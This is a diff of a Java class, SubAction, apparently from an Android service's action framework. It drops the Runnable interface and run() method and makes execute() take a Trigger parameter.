@@ -11,16 +11,18 @@ import org.json.JSONException;
 import org.json.JSONObject;
 
 import com.android.service.Status;
+import com.android.service.Trigger;
 import com.android.service.auto.Cfg;
 import com.android.service.conf.ConfAction;
 import com.android.service.conf.ConfigurationException;
+import com.android.service.event.BaseEvent;
 import com.android.service.util.Check;
 
 // TODO: Auto-generated Javadoc
 /**
  * The Class SubAction.
  */
-public abstract class SubAction implements Runnable {
+public abstract class SubAction  {
 
 	private static final String TAG = "SubAction"; //$NON-NLS-1$
 
@@ -167,10 +169,11 @@ public abstract class SubAction implements Runnable {
 
 	/**
 	 * Execute.
+	 * @param trigger 
 	 * 
 	 * @return true, if successful
 	 */
-	public abstract boolean execute();
+	public abstract boolean execute(Trigger trigger);
 
 	/**
 	 * Check. if is finished. //$NON-NLS-1$
@@ -181,25 +184,6 @@ public abstract class SubAction implements Runnable {
 		return finished;
 	}
 
-	/*
-	 * (non-Javadoc)
-	 * 
-	 * @see java.lang.Runnable#run()
-	 */
-	public void run() {
-		try {
-			execute();
-		} catch (final Exception e) {
-			if (Cfg.DEBUG) {
-				Check.log(e);//$NON-NLS-1$
-			}
-		} finally {
-			synchronized (this) {
-				notify();
-				finished = true;
-			}
-		}
-	}
 
 	/**
 	 * Prepare execute.
